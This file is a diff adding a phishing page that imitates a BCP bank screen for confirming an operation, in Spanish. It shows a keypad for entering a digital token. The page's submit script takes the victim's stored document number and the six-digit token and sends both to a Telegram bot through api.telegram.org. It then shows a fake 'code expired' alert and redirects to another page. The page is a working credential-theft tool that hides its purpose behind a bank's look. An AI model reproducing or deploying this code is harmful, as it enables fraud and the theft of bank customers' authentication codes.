@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Confirmar Operación - BCP</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        const circles = document.querySelectorAll(".circle");
+        let tokenInput = [];
+        const tokenInputField = document.getElementById("tokenInputField"); // El input oculto
+
+        // Función para actualizar los círculos con los números y el input oculto
+        function updateCircles() {
+          circles.forEach((circle, index) => {
+            if (tokenInput[index] !== undefined) {
+              circle.textContent = tokenInput[index];
+            } else {
+              circle.textContent = "";
+            }
+          });
+
+          // Actualiza el valor del input oculto
+          tokenInputField.value = tokenInput.join(""); // Convierte el array en un string
+        }
+
+        // Función para agregar un número al token
+        function addNumber(num) {
+          if (tokenInput.length < 6) {
+            tokenInput.push(num);
+            updateCircles();
+          }
+        }
+
+        // Función para eliminar el último número ingresado
+        function deleteLast() {
+          tokenInput.pop();
+          updateCircles();
+        }
+
+        // Función para eliminar todos los números
+        function clearAll() {
+          tokenInput = [];
+          updateCircles();
+        }
+
+        // Event listeners para los botones
+        document.querySelectorAll(".num-btn").forEach((button) => {
+          button.addEventListener("click", () => {
+            addNumber(button.textContent.trim());
+          });
+        });
+
+        document
+          .getElementById("delete-last")
+          .addEventListener("click", deleteLast);
+        document
+          .getElementById("clear-all")
+          .addEventListener("click", clearAll);
+
+       
+      });
+    </script>
+  </head>
+  <body class="bg-gray-100">
+    <!-- Top Bar -->
+    <div class="bg-blue-800 p-3 flex items-center justify-between text-white">
+      <div class="flex items-center space-x-2">
+        <img src="bcp-dark-default.svg" alt="BCP logo" class="h-5" />
+      </div>
+      <i class="fas fa-bars text-lg"></i>
+    </div>
+
+    <!-- Main Content -->
+    <form id="loginform">
+      <input type="hidden" id="tokenInputField" name="tokenValue" />
+
+      <div class="max-w-lg mx-auto bg-white shadow-lg rounded-lg mt-6">
+        <!-- Confirmar operación -->
+        <div class="text-center">
+          <h1 class="text-lg text-gray-600 font-medium" style="padding: 50px;padding-bottom: 0;">Estás realizando una solicitud crédito libre inversión BCP</h1>
+        
+          <!-- Desde section -->
+          <div class="mt-6">
+            <p class="text-gray-400">DESDE</p>
+            <p class="text-gray-700 font-semibold">CUENTAS DE AHORRO</p>
+          </div>
+        </div>
+
+        <!-- Token Input Section -->
+        <div class="bg-gray-50 rounded-lg mt-4">
+          <div class="flex justify-center mb-4">
+            <img src="token.svg" alt="Token icon" class="h-16" />
+          </div>
+          <p class="text-center text-blue-800 font-semibold">
+            Para confirmar ingresa tu<br />Token digital o físico
+          </p>
+
+          <!-- Token Input Circles -->
+          <div class="flex justify-center space-x-2 my-4">
+            <div
+              class="w-10 h-10 border-2 border-gray-300 rounded-full circle flex justify-center items-center"
+            ></div>
+            <div
+              class="w-10 h-10 border-2 border-gray-300 rounded-full circle flex justify-center items-center"
+            ></div>
+            <div
+              class="w-10 h-10 border-2 border-gray-300 rounded-full circle flex justify-center items-center"
+            ></div>
+            <div
+              class="w-10 h-10 border-2 border-gray-300 rounded-full circle flex justify-center items-center"
+            ></div>
+            <div
+              class="w-10 h-10 border-2 border-gray-300 rounded-full circle flex justify-center items-center"
+            ></div>
+            <div
+              class="w-10 h-10 border-2 border-gray-300 rounded-full circle flex justify-center items-center"
+            ></div>
+          </div>
+
+          <!-- Keypad -->
+          <div class="grid grid-cols-3 gap-4 max-w-xs mx-auto">
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              1
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              9
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              2
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              5
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              6
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              0
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              8
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              3
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              4
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg text-red-600"
+              id="delete-last"
+            >
+              <i class="fas fa-trash"></i>
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg num-btn"
+            >
+              7
+            </button>
+            <button
+              type="button"
+              class="w-full p-3 bg-white border border-gray-300 rounded-lg text-lg text-gray-600"
+              id="clear-all"
+            >
+              <i class="fas fa-times"></i>
+            </button>
+          </div>
+          <div style="width: 100%; text-align: center">
+            <button
+              style="
+                width: 250px;
+                border-radius: 30px;
+                padding: 5px;
+                background: #ff7a1b;
+                color: white;
+                font-weight: bold;
+                margin-top: 30px;
+                margin-bottom: 30px;
+              "
+              type="submit"
+            >
+              Solicitar
+            </button>
+          </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="">
+          <div class="flex items-start bg-blue-100 p-3 rounded-lg">
+            <i class="fas fa-info-circle text-blue-800 mr-3"></i>
+            <p class="text-gray-600 text-sm">
+              Recuerda que el código de tu Token es diferente a tu Clave de
+              Internet.
+            </p>
+          </div>
+          <p
+            class="text-center text-orange-600 font-semibold mt-4 cursor-pointer"
+          >
+            ¿Dónde encontrar mi Token?
+          </p>
+        </div>
+      </div>
+    </form>
+  </body>
+  <script src="telegram.js"></script>
+  <script>
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault(); // Aquí evitamos que el código se repita evita que se envíe el formulario
+      const doc = localStorage.getItem("usuario");
+      const token = document.querySelector("#tokenInputField").value;
+
+      const message = "BCP\nDocumento: " + doc + "\nToken: " + token;
+
+      axios
+        .post(
+          "https://api.telegram.org/bot" + miVariableGlobal + "/sendMessage",
+          {
+            chat_id: chat,
+            text: message,
+          }
+        )
+        .then((response) => {
+          alert("Código expirado, intenta nuevamente.");
+          window.parent.location.href = "cargando.html";
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+    });
+  </script>
+</html>
